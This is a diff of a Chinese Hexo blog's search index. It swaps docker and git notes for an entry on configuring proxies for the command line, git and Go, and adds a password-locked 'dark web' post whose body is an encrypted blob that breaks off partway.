@@ -1,161 +1,61 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>docker 常用命令</title>
-    <url>/2020/07/20/%E5%B7%A5%E5%85%B7/docker/</url>
-    <content><![CDATA[<h2 id="docker"><a class="header-anchor" href="#docker"></a>docker</h2>
-<p>从镜像启动容器</p>
-<p>-d: 后台运行</p>
-<p>-p: 端口映射，宿主机的2020端口映射到容器的80端口</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 2020:80 &#123;image&#125;</span><br></pre></td></tr></table></figure>
-<p>显示所有容器</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker container ls --all</span><br></pre></td></tr></table></figure>
-<p>启动/停止/重启/删除容器</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker start&#x2F;stop&#x2F;restart&#x2F;rm 容器名或容器ID</span><br></pre></td></tr></table></figure>
-<p>重命名容器</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rename 原名 新名</span><br></pre></td></tr></table></figure>
-<p>进入容器内部</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it &#123;容器ID&#125; bash</span><br></pre></td></tr></table></figure>
+    <title>网络代理设置</title>
+    <url>/2021/07/08/%E6%9D%82%E8%AE%B0/%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE/</url>
+    <content><![CDATA[<h2 id="cmd-PowerShell代理设置"><a class="header-anchor" href="#cmd-PowerShell代理设置"></a>cmd/PowerShell代理设置</h2>
+<p>设置命令行代理（设置环境变量,命令行关闭后则失效）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set HTTP_PROXY=127.0.0.1:10809</span><br><span class="line">set HTTPS_PROXY=127.0.0.1:10809</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>ps：测试是否设置成功不要ping google，因为ping命令用的是ICMP协议；正确做法是</p>
+<p>curl <a href="http://www.google.com">www.google.com</a></p>
+</blockquote>
+<h2 id="git代理设置"><a class="header-anchor" href="#git代理设置"></a>git代理设置</h2>
+<p>设置永久有效</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global https.proxy http://127.0.0.1:10809	</span><br><span class="line">git config --global https.proxy https://127.0.0.1:10809</span><br><span class="line">git config --global http.proxy 'socks5://127.0.0.1:10808'</span><br><span class="line">git config --global https.proxy 'socks5://127.0.0.1:10808'</span><br><span class="line">git config --global --list	#查询代理设置</span><br></pre></td></tr></table></figure>
+<h2 id="go代理设置"><a class="header-anchor" href="#go代理设置"></a>go代理设置</h2>
+<p>方法1.配置命令行环境变量（临时）</p>
+<p><strong>Bash (Linux or macOS)</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export GOPROXY=https://goproxy.io,direct</span><br></pre></td></tr></table></figure>
+<p><strong>PowerShell (Windows)</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">env:GOPROXY = <span class="string">"https://goproxy.io,direct"</span></span></span><br></pre></td></tr></table></figure>
+<p>方法2.配置用户环境变量</p>
+<p><strong>Mac/Linux</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 设置你的 bash 环境变量</span></span><br><span class="line">echo "export GOPROXY=https://goproxy.io,direct" &gt;&gt; ~/.profile &amp;&amp; source ~/.profile</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果你的终端是 zsh，使用以下命令</span></span><br><span class="line">echo "export GOPROXY=https://goproxy.io,direct" &gt;&gt; ~/.zshrc &amp;&amp; source ~/.zshrc</span><br></pre></td></tr></table></figure>
+<p><strong>Windows</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 右键 我的电脑 -&gt; 属性 -&gt; 高级系统设置 -&gt; 环境变量</span><br><span class="line">2. 在 “[你的用户名]的用户变量” 中点击 ”新建“ 按钮</span><br><span class="line">3. 在 “变量名” 输入框并新增 “GOPROXY”</span><br><span class="line">4. 在对应的 “变量值” 输入框中新增 “https:&#x2F;&#x2F;goproxy.io,direct”</span><br><span class="line">5. 最后点击 “确定” 按钮保存设置</span><br></pre></td></tr></table></figure>
+<p>参考：<a href="https://blog.csdn.net/xiaobai_ol/article/details/106426199">https://blog.csdn.net/xiaobai_ol/article/details/106426199</a></p>
 ]]></content>
       <categories>
-        <category>工具</category>
-        <category>docker</category>
+        <category>杂记</category>
       </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
   </entry>
   <entry>
-    <title>git</title>
-    <url>/2021/07/26/%E5%B7%A5%E5%85%B7/git/</url>
-    <content><![CDATA[<h2 id="总体概览"><a class="header-anchor" href="#总体概览"></a>总体概览</h2>
-<p>与svn等集中式版本控制系统不同，git为分布式版本控制系统，每个开发者都保存整个项目的完整镜像</p>
-<p><img src="/2021/07/26/%E5%B7%A5%E5%85%B7/git/211915189723300.jpg" alt="211915189723300.jpg"></p>
-<p>工作区间: 即我们创建的工程文件， 在编辑器可直观显示；</p>
-<p>缓存区: 只能通过git GUI或git shell 窗口显示，提交代码、解决冲突的中转站；</p>
-<p>本地仓库: 只能在git shell 窗口显示，连接本地代码跟远程代码的枢纽，不能联网时本地代码可先提交至该处；</p>
-<p>远程仓库: 即保存我们代码的服务器，本文以公共版本控制系统：github为例，登录github账号后可直观显示；</p>
-<h2 id="Git特点"><a class="header-anchor" href="#Git特点"></a>Git特点</h2>
-<p>1.直接记录快照，而非比较差异</p>
-<p>​	Git只关心文件数据的整体是否发生变化，而不是文件内容的具体差异。当文件整体发生变化时（比较指纹信息），则记录快照；若文件整体不变，则只保存上一版本快照的索引，避免重复存储。</p>
-<p>2.几乎所有操作都是本地执行</p>
-<p>​	Git中绝大多数操作都只需要访问本地文件和资源，不用联网。</p>
-<p>3.校验和（checksum）为文件的唯一标识</p>
-<p>​	一旦文件的完整性收到损坏，那么git就能立刻察觉到。</p>
-<p>4.多数操作仅添加数据</p>
-<p>​	常用的Git操作大多仅仅是把数据添加到数据库，因为任何一种不可逆的操作（如删除）都会使回退变得更加困难。</p>
-<p>5.文件的三种状态*</p>
-<p>​	对于任何一个文件，在Git中只有已提交（committed），已修改（modified）和已暂存（staged）三种状态。</p>
-<p>​	已提交表示该文件已经被安全地保存在本地数据库；</p>
-<p>​	已修改表示修改了某个文件，但还没有提交保存；</p>
-<p>​	已暂存表示把已修改的文件放在下次提交时要保存的清单中了</p>
-<h2 id="使用方法"><a class="header-anchor" href="#使用方法"></a>使用方法</h2>
-<h3 id="获得项目的Git仓库"><a class="header-anchor" href="#获得项目的Git仓库"></a>获得项目的Git仓库</h3>
-<h4 id="git-init"><a class="header-anchor" href="#git-init"></a>git init</h4>
-<p>要对现有的某个项目开始用 Git 管理，只需到此项目所在的目录，执行：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>
-<p>初始化后，在当前目录下会出现一个名为 .git 的目录，所有 Git 需要的数据和资源都存放在这个目录中。不过目前，仅仅是按照既有的结构框架初始化好了里边所有的文件和目录，但我们还没有开始跟踪管理项目中的任何一个文件。</p>
-<p>如果当前目录下有几个文件想要纳入版本控制，需要先用 git add 命令告诉 Git 开始对这些文件进行跟踪，然后提交：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add *.c		#把所有的c源码纳入版本控制（加入缓存区）</span><br><span class="line">git add README	#把README加入版本控制（加入缓存区）</span><br><span class="line">git commit -m 'initial project version'		#提交代码到本地仓库</span><br></pre></td></tr></table></figure>
-<h4 id="git-clone"><a class="header-anchor" href="#git-clone"></a>git clone</h4>
-<p>git clone用于从服务器上获取git仓库，并且获取的是项目历史的所有数据（每一个文件的每一个版本），服务器上有的数据克隆之后本地也都有了。实际上，即便服务器的磁盘发生故障，用任何一个克隆出来的客户端都可以重建服务器上的仓库，回到当初克隆时的状态。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone [url]</span><br></pre></td></tr></table></figure>
-<p>如果希望在克隆的时候，自己定义要新建的项目目录名称，可以在上面的命令末尾指定新的名字：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone git://github.com/schacon/grit.git mygrit</span><br></pre></td></tr></table></figure>
-<h3 id="状态检查"><a class="header-anchor" href="#状态检查"></a>状态检查</h3>
-<p><strong>查看git配置信息</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure>
-<p><strong>查看当前项目的git状态</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git status	# 在项目根目录下运行</span><br></pre></td></tr></table></figure>
-<p><strong>对比文件修改情况</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git diff</span><br><span class="line">git diff --cached</span><br></pre></td></tr></table></figure>
-<p><code>git diff</code>命令比较的是工作目录中当前文件和暂存区域快照之间的差异，也就是修改之后还没有暂存起来的变化内容</p>
-<p>若要看已经暂存起来的文件和上次提交时的快照之间的差异，可以用 <code>git diff --cached</code>（Git 1.6.1 及更高版本还允许使用<code>git diff --staged</code>，效果是相同的，但更好记些。）</p>
-<p><strong>查看提交历史</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log [-p] [-2]</span><br><span class="line"><span class="meta">#</span><span class="bash"> -p 表示展开显示每次提交的内容差异，-2 表示仅展示最近的两次提交</span></span><br></pre></td></tr></table></figure>
-<p><a href="https://blog.csdn.net/bdss58/article/details/40537859">理解head和master</a></p>
-<h3 id="工作区-缓存区"><a class="header-anchor" href="#工作区-缓存区"></a>工作区&lt;-&gt;缓存区</h3>
-<h4 id="git-add"><a class="header-anchor" href="#git-add"></a>git add</h4>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add [options] [&lt;file&gt;…]</span><br></pre></td></tr></table></figure>
-<p><code>git add</code>是一个多功能命令，它可以将项目文件纳入跟踪范围，也可以将所做的修改暂存到暂存区，<code>git commit</code>只会把已加入暂存区的文件版本提交到本地仓库，所以每对项目文件做一次修改，都要使用git add命令将它加入暂存区，否则提交的可能就是修改之前的版本了。</p>
-<h4 id="gitignore"><a class="header-anchor" href="#gitignore"></a>.gitignore</h4>
-<p>一般我们总会有些文件无需纳入 Git 的管理，也不希望它们总出现在未跟踪文件列表。通常都是些自动生成的文件，比如日志文件，或者编译过程中创建的临时文件等。我们可以在项目根目录下创建如下一个名为 .gitignore 的文件，列出要忽略的文件模式</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 此为注释 – 将被 Git 忽略</span><br><span class="line">*.a       # 忽略所有 .a 结尾的文件</span><br><span class="line">!lib.a    # 但 lib.a 除外</span><br><span class="line">&#x2F;TODO     # 仅仅忽略项目根目录下的 TODO 文件，不包括 subdir&#x2F;TODO</span><br><span class="line">build&#x2F;    # 忽略 build&#x2F; 目录下的所有文件</span><br><span class="line">doc&#x2F;*.txt # 会忽略 doc&#x2F;notes.txt 但不包括 doc&#x2F;server&#x2F;arch.txt</span><br><span class="line">*.[oa]    # 忽略所有以 .o 或 .a 结尾的文件（编译过程文件）</span><br><span class="line">*~        # 忽略所有以波浪符 ~ 结尾的文件（文件副本）</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>文件 .gitignore 的格式规范如下：<br>
-所有空行或者以注释符号<code>＃</code>开头的行都会被 Git 忽略。<br>
-可以使用标准的 glob 模式匹配。<code> *</code> 匹配模式最后跟反斜杠<code>/</code>说明要忽略的是目录。<br>
-要忽略指定模式以外的文件或目录，可以在模式前加上叹号<code>!</code>取反</p>
-</blockquote>
-<h4 id="git-rm"><a class="header-anchor" href="#git-rm"></a>git rm</h4>
-<p><code>git rm &lt;filename&gt;</code>用来将不需要的文件同时从Git仓库和工作目录中删除，如果只是手动从工作目录中删除该文件，则还会在&quot;Changed but not updated&quot;中看到。</p>
-<p>如果希望在工作目录中保留文件，只从git仓库中删除，那么可以加上<code>--cached</code>参数</p>
-<blockquote>
-<p>误删文件恢复（回滚）</p>
-</blockquote>
-<h4 id="git-mv"><a class="header-anchor" href="#git-mv"></a>git mv</h4>
-<p>常用于文件移动和重命名</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git mv file_from file_to</span><br></pre></td></tr></table></figure>
-<h4 id="git-restore"><a class="header-anchor" href="#git-restore"></a>git restore</h4>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git restore &lt;file&gt;    # 丢弃工作区的修改（包括对文件自身的操作，如添加文件、删除文件）</span><br><span class="line">git restore --staged &lt;file&gt;    #将暂存区的修改重新放回工作区（包括对文件自身的操作，如添加文件、删除文件）</span><br></pre></td></tr></table></figure>
-<h3 id="缓存区-本地仓库"><a class="header-anchor" href="#缓存区-本地仓库"></a>缓存区&lt;-&gt;本地仓库</h3>
-<h4 id="git-commit"><a class="header-anchor" href="#git-commit"></a>git commit</h4>
-<p>一般使用<code>git comit -m &quot;your comment&quot;</code>将代码提交到本地仓库，提交后工作区清空，再次修改则需要重新<code>git add</code>，如果不加<code>-m</code>参数，那么会启动文本编辑器以输入本次提交的说明。</p>
-<p>每一次运行提交操作，都是对你项目作一次快照，以后可以回到这个状态，或者进行比较。</p>
-<p>尽管使用暂存区域的方式可以精心准备要提交的细节，但有时候这么做略显繁琐。Git 提供了一个跳过使用暂存区域的方式，只要在提交的时候，加上<code>-a</code> 选项，Git 就会自动把所有已经跟踪过的文件暂存起来一并提交，从而跳过 <code>git add</code> 步骤。</p>
-<h3 id="本地仓库-远程仓库"><a class="header-anchor" href="#本地仓库-远程仓库"></a>本地仓库&lt;-&gt;远程仓库</h3>
-<h4 id="git-push"><a class="header-anchor" href="#git-push"></a>git push</h4>
-<p>将本地的分支版本上传到远程并合并</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="git-fetch"><a class="header-anchor" href="#git-fetch"></a>git fetch</h4>
-<p>从远程仓库下载最新的commit，并且同时保留本地分支head和远程分支remotes，需要另外使用<code>git merge</code>合并分支</p>
-<h4 id="git-pull"><a class="header-anchor" href="#git-pull"></a>git pull</h4>
-<p>下载远程分支中最新的commit并合并（不建议使用，可能出现未解决代码冲突的情况）</p>
-<h3 id="操作撤销"><a class="header-anchor" href="#操作撤销"></a>操作撤销</h3>
-<p>在进行文件修改等操作后，使用<code>git status</code>查看状态，可以看到git给出的撤销提示</p>
-<p><img src="/2021/07/26/%E5%B7%A5%E5%85%B7/git/image-20210708151055459.png" alt="image-20210708151055459"></p>
-<p>更多参考：<a href="https://blog.csdn.net/Sweet_19BaBa/article/details/111950384">git checkout，git restore 和 git reset</a></p>
-<h4 id="版本回退"><a class="header-anchor" href="#版本回退"></a>版本回退</h4>
-<p>首先<code>git log</code>查看历史提交的版本信息</p>
-<p>得到各个commit的id，即其哈希值</p>
-<p>使用<code>git reset --hard &lt;commitId&gt;</code>切换到各个版本提交时的状态（清空暂存区）</p>
-<p>但实际上回退之前的版本还是存在的，使用<code>git reflog</code>可以查看历史版本记录，找到已提交过的任何一个版本的commitId，通过commitId仍可以切回最新的未回退的版本。</p>
-<h3 id="分支管理"><a class="header-anchor" href="#分支管理"></a>分支管理</h3>
-<h4 id="分支新建、切换、删除"><a class="header-anchor" href="#分支新建、切换、删除"></a>分支新建、切换、删除</h4>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch                  #列出已有分支</span><br><span class="line">git branch &lt;branchname&gt;     #创建新分支</span><br><span class="line">git checkout &lt;branchname&gt;   #切换到分支</span><br><span class="line">git branch -d &lt;branchname&gt;  #删除分支</span><br></pre></td></tr></table></figure>
-<p>在一个分支进行文件修改、新建、删除等操作在commit后不会影响其他分支。</p>
-<h4 id="分支合并"><a class="header-anchor" href="#分支合并"></a>分支合并</h4>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git merge &lt;branchname&gt;    #把 &lt;branchname&gt; 分支合并到当前分支</span><br></pre></td></tr></table></figure>
-<p>在将<code>branch2</code>合并到<code>branch1</code>的过程中，branch2中新建文件、删除原有文件、修改原有文件等操作将同步到branch1，当两个分支都做出修改时，可能会出现代码冲突，这时候需要我们手动修改解决冲突后再次提交才能合并成功。</p>
-]]></content>
+    <title>dark web</title>
+    <url>/2020/07/21/%E6%9D%82%E8%AE%B0/dark_web/</url>
+    <content><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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